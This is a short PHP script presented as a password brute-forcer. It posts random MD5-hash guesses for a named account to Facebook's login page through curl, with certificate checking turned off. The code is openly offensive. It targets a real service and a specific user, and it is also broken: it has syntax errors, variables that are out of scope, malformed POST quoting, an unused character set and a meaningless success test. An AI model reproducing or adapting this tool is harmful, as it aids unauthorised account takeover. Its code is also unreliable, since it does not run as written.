<?php

global $wrong;
global $startpagina;
$time = microtime() * 100000;
$username = "kenkensquidkuddlephish";
echo "https://twitter.com/LizardL4nds";
$Pass = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890!@#$%&*';          /*character set which is used to brute force the password*/
$c_len = strlen($Pass); 
$c_len--;
$min = 1;
$max = 12;
function bruteForce($Pass)
{
while(True)
{     
	$Pass = strtoupper(md5(rand(0, 1000000)));

	check_correct($Pass) {
	echo('FOUND MATCH, password: '.$Pass.);
     }
   }
}
function check_correct($Pass)
{
	$c = curl_init('https://www.facebook.com/login');
        curl_setopt($c, CURLOPT_HTTPAUTH, CURLAUTH_ANY); // use authentication
        curl_setopt($c, CURLOPT_POST, 1);
        curl_setopt($c, CURLOPT_POSTFIELDS, "email='.$username.'&pass='.$Pass.'");
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); // We need to fetch something from a string, so no direct output!
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1); // we get redirected, so follow
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 2);
        curl_setopt($c, CURLOPT_UNRESTRICTED_AUTH, 0); // always stay authorised
        $str = curl_exec($c); // Get it
        curl_close($c); 
	if($str != "Startpagina") {return true;}
        else {return false;}
}
bruteForce($Pass);
echo "NO PASSWORD FOUND"; 
?>
